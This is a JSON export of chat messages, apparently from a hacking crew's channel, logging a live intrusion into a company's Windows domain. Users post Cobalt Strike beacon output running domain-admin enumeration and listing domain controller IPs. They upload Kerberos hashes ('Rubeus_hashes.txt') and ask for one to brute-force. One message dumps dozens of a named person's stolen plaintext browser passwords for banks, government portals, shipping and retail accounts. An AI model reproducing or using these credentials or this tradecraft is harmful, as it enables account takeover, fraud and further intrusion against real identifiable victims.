@@ -1,0 +1,531 @@
+{
+  "messages": [
+    {
+      "_id": "ycYntfHST5de5Eeqf",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "msg": "ok",
+      "ts": "2020-12-21T23:21:50.821Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T23:21:50.853Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "T4CKnrsvaCfPGByYY",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "msg": "в лс @tl2",
+      "ts": "2020-12-21T23:19:15.030Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-21T23:19:15.074Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "vvFw2tkHqpJnHwww7",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "msg": "@tl1 @tl2 можно хэшик на брут",
+      "ts": "2020-12-21T23:11:19.847Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T23:11:19.880Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        },
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "h9PrEKJudGLk82LXE",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T23:09:45.483Z",
+      "msg": "",
+      "file": {
+        "_id": "z76iHxxctE6CC7TJv",
+        "name": "Rubeus_hashes.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Rubeus_hashes.txt",
+          "title_link": "/file-upload/z76iHxxctE6CC7TJv/Rubeus_hashes.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T23:09:45.528Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RjmA7ZnP75ekxDcKQ",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "msg": "```\n[*] Tasked beacon to run .NET program: SharpChromium.exe logins\n[+] host called home, sent: 690231 bytes\n[+] received output:\n[*] Beginning Google Chrome extraction.\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://registration.tco.census.gov/myreg/change-password.jsf\nUsername : michaellee@missme.com\nPassword : MissRock90058%\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://id-provider.tco.census.gov/nidp/saml2/sso\nUsername : michaellee@missme.com\nPassword : MissRock90058%\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.ups.com/lasso/login\nUsername : dm1002\nPassword : KPN@12th\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.ups.com/lasso/login\nUsername : dm1001\nPassword : KPN@12th\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : deodarmichael1\nPassword : sweet8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://web17.secureinternetbank.com/EBC_EBC1961/EBC1961.ashx\nUsername : \nPassword : 152994828040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcusa.com/PBCLogin/pbclogin.aspx\nUsername : 3180\nPassword : rock0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcusa.com/PBCLogin/pbclogin.aspx\nUsername : 3601\nPassword : dm0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.fedex.com/en-us/home.html\nUsername : MissMe\nPassword : Sweet90058!\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://sdg2.mastercard.com/static/private-portal-ui/\nUsername : Mi\nPassword : seoul\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.ups.com/lasso/login\nUsername : MISSMEMICHAEL\nPassword : !Alameda4715\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : willing1\nPassword : 0058sweet\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : willinglee\nPassword : sweet8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : 3031olympicmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://sellercentral.amazon.com/ap/signin\nUsername : AndyP@missme.com\nPassword : 4715Missme\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://danceandmarvel.com/index.php/oitmain\nUsername : michael\nPassword : michael1234\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://identity.avalara.com/account/login\nUsername : michaellee@missme.com\nPassword : Miss8040*\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : 3019westmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : 355kingsleymichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.onlinelabels.com/SignIn.aspx\nUsername : michaellee@missme.com\nPassword : sweet8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://sdg2.mastercard.com/pkmslogin.form\nUsername : Michael_Lee\nPassword : ^RcRvMiSs90058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : rcrvmichael1\nPassword : Rcrv8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : missmemichael1\nPassword : spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : d&mmichael1\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.amazon.com/ap/signin\nUsername : patriciachoi@missme.com\nPassword : graceful0619\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.costcobusinessdelivery.com/Logon\nUsername : soohkim@missme.com\nPassword : sweet7706\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://login.bigcommerce.com/login\nUsername : lisakim@missme.com\nPassword : RRvdrr $4715\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcusa.com/PBCLogin/pbclogin.aspx\nUsername : 2987\nPassword : mm0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : michaelmaison\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.certify.com/Login.aspx\nUsername : michaellee@missme.com\nPassword : $MissRock\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://login.yahoo.com/account/challenge/password\nUsername : jclmichaellee\nPassword : $Holy0731\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://accounts.shopify.com/login\nUsername : michaellee@missme.com\nPassword : MissMe8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.amazon.com/ap/signin\nUsername : AndyP@missme.com\nPassword : 4715Missme\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : rcrvmichael1\nPassword : Rcrv8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : d&mmichael1\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : michaelmaison\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : missmemichael1\nPassword : spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : willinglee\nPassword : sweet8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : 3019westmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : 355kingsleymichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : 3031olympicmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://delsolpm.appfolio.com/connect/users/sign_in\nUsername : michaellee@missme.com\nPassword : young90058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : pcho94\nPassword : whos90058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://www.efax.com/myaccount/login\nUsername : 2132323675\nPassword : 1260\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : heprmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : heprmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : \nUsername : michaellee@missme.com\nPassword : spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://online.hanmi.com/HanmiBankOnline/Uux.aspx\nUsername : pcho94\nPassword : whos90058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://securedmail.bankofhope.com/securereader/login.jsf\nUsername : michaellee@missme.com\nPassword : spa0804?\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://engpermits.lacity.org/public/control.cfm\nUsername : Michael Lee\nPassword : kingsley355\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://engpermits.lacity.org/public/control.cfm\nUsername : michaellee@missme.com\nPassword : kingsley355\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : rcrvmichael1\nPassword : Rcrv8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcfin.com/PBCLogin/pbclogin.aspx\nUsername : 2987\nPassword : mm0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcfin.com/PBCLogin/pbclogin.aspx\nUsername : 29873180\nPassword : rock0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcfin.com/PBCLogin/pbclogin.aspx\nUsername : 3180\nPassword : rock0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.pbcfin.com/PBCLogin/pbclogin.aspx\nUsername : 3601\nPassword : dm0058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : michaelmaison\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : missmemichael1\nPassword : spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : heprmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : pcho94\nPassword : whos90058\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : willinglee\nPassword : sweet8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : 3019westmichael\nPassword : Spai8040\n\n--- Chromium Credential (User: MichaelLee) ---\nURL      : https://secure.hanmi.com/hanmibankonline/uux.aspx\nUsername : d&mmichael1\nPassword : Spai8040\n\n[*] Finished Google Chrome extraction.\n```",
+      "ts": "2020-12-21T22:53:24.123Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:53:41.636Z",
+      "urls": [
+        {
+          "url": "https://registration.tco.census.gov/myreg/change-password.jsf"
+        },
+        {
+          "url": "https://id-provider.tco.census.gov/nidp/saml2/sso"
+        },
+        {
+          "url": "https://www.ups.com/lasso/login"
+        },
+        {
+          "url": "https://www.ups.com/lasso/login"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://web17.secureinternetbank.com/EBC_EBC1961/EBC1961.ashx"
+        },
+        {
+          "url": "https://secure.pbcusa.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://secure.pbcusa.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://www.fedex.com/en-us/home.html"
+        },
+        {
+          "url": "https://sdg2.mastercard.com/static/private-portal-ui/"
+        },
+        {
+          "url": "https://www.ups.com/lasso/login"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://sellercentral.amazon.com/ap/signin"
+        },
+        {
+          "url": "https://danceandmarvel.com/index.php/oitmain"
+        },
+        {
+          "url": "https://identity.avalara.com/account/login"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://secure.onlinelabels.com/SignIn.aspx"
+        },
+        {
+          "url": "https://sdg2.mastercard.com/pkmslogin.form"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://www.amazon.com/ap/signin"
+        },
+        {
+          "url": "https://www.costcobusinessdelivery.com/Logon"
+        },
+        {
+          "url": "https://login.bigcommerce.com/login"
+        },
+        {
+          "url": "https://secure.pbcusa.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://www.certify.com/Login.aspx"
+        },
+        {
+          "url": "https://login.yahoo.com/account/challenge/password"
+        },
+        {
+          "url": "https://accounts.shopify.com/login"
+        },
+        {
+          "url": "https://www.amazon.com/ap/signin"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://delsolpm.appfolio.com/connect/users/sign_in"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://www.efax.com/myaccount/login"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://online.hanmi.com/HanmiBankOnline/Uux.aspx"
+        },
+        {
+          "url": "https://securedmail.bankofhope.com/securereader/login.jsf"
+        },
+        {
+          "url": "https://engpermits.lacity.org/public/control.cfm"
+        },
+        {
+          "url": "https://engpermits.lacity.org/public/control.cfm"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.pbcfin.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://secure.pbcfin.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://secure.pbcfin.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://secure.pbcfin.com/PBCLogin/pbclogin.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        },
+        {
+          "url": "https://secure.hanmi.com/hanmibankonline/uux.aspx"
+        }
+      ],
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-12-21T22:53:41.634Z",
+      "editedBy": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7"
+      }
+    },
+    {
+      "_id": "PMEnDqo9zopsW5Qq3",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:53:19.516Z",
+      "msg": "",
+      "file": {
+        "_id": "zdH7jqLMio3sgBA9h",
+        "name": "SeatBeltLogs_all.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "SeatBeltLogs_all.txt",
+          "title_link": "/file-upload/zdH7jqLMio3sgBA9h/SeatBeltLogs_all.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:53:19.539Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bjHjdoSBTuWShgjxb",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:44:29.227Z",
+      "msg": "",
+      "file": {
+        "_id": "8mAkP4ABySMwcCF5y",
+        "name": "ad_users.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_users.txt",
+          "title_link": "/file-upload/8mAkP4ABySMwcCF5y/ad_users.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:44:29.269Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mer2LbSkhDWxdrri5",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:44:27.852Z",
+      "msg": "",
+      "file": {
+        "_id": "jaoihdTegMbSgSYJr",
+        "name": "ad_trust.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_trust.txt",
+          "title_link": "/file-upload/jaoihdTegMbSgSYJr/ad_trust.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:44:27.878Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "khdfHEsmoFgmQkpLL",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:44:27.112Z",
+      "msg": "",
+      "file": {
+        "_id": "wX3gpjqYRb72zH4sj",
+        "name": "ad_subnets.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_subnets.txt",
+          "title_link": "/file-upload/wX3gpjqYRb72zH4sj/ad_subnets.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:44:27.140Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WS7ryL2EwqmMEG5Yc",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:44:26.371Z",
+      "msg": "",
+      "file": {
+        "_id": "hMDWmnxKTSXMLKt2t",
+        "name": "ad_ous.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_ous.txt",
+          "title_link": "/file-upload/hMDWmnxKTSXMLKt2t/ad_ous.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:44:26.396Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kwQwwm2eCyT3FALTQ",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:44:25.997Z",
+      "msg": "",
+      "file": {
+        "_id": "NDFoTNSpX9FRp6Hxe",
+        "name": "ad_group.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_group.txt",
+          "title_link": "/file-upload/NDFoTNSpX9FRp6Hxe/ad_group.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:44:26.032Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FMtQ8ek777DccQxwa",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "ts": "2020-12-21T22:44:25.757Z",
+      "msg": "",
+      "file": {
+        "_id": "MjAEmkwN4zoWsXYej",
+        "name": "ad_computer.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_computer.txt",
+          "title_link": "/file-upload/MjAEmkwN4zoWsXYej/ad_computer.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:44:25.788Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "E4CWJN5SvTezGnvtw",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "msg": "```\nDomain Controllers:\n\n Server Name             IP Address                      \n -----------             ----------                      \n MM-DC1                  192.168.1.2\n MM-DC2                  192.168.1.111\n MM-DC3                  192.168.1.214\n```",
+      "ts": "2020-12-21T22:37:36.745Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:37:36.821Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MYFaHXd95Y3dotnZ7",
+      "rid": "J8X8QGoYBY8ZaYFQW",
+      "msg": "```\nTeemo[HQ217]MichaelLee */13384|2020Dec22 01:33:58> shell net group \"Domain Admins\" /dom\n[*] Tasked beacon to run: net group \"Domain Admins\" /dom\n[+] host called home, sent: 61 bytes\n[+] received output:\nThe request will be processed at a domain controller for domain MissMe.local.\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            JasonTak                 MEGACOM                  \nThomasChang              \nThe command completed successfully.\n\n\nTeemo[HQ217]MichaelLee */13384|2020Dec22 01:34:24> shell net group \"Enterprise Admins\" /dom\n[*] Tasked beacon to run: net group \"Enterprise Admins\" /dom\n[+] host called home, sent: 65 bytes\n[+] received output:\nThe request will be processed at a domain controller for domain MissMe.local.\n\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            ServerAdmin$             ServerAdmin1$            \nServerAdmin2$            \nThe command completed successfully.\n\n\nTeemo[HQ217]MichaelLee */13384|2020Dec22 01:34:51> shell net localgroup Administrators\n[*] Tasked beacon to run: net localgroup Administrators\n[+] host called home, sent: 60 bytes\n[+] received output:\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nmegacom\nmegacom1\nMISSME\\brandonsantana\nMISSME\\Domain Admins\nMISSME\\IT_Admins\nMISSME\\MichaelLee\nthomas\nThe command completed successfully.\n\n```",
+      "ts": "2020-12-21T22:35:28.484Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-21T22:35:28.739Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
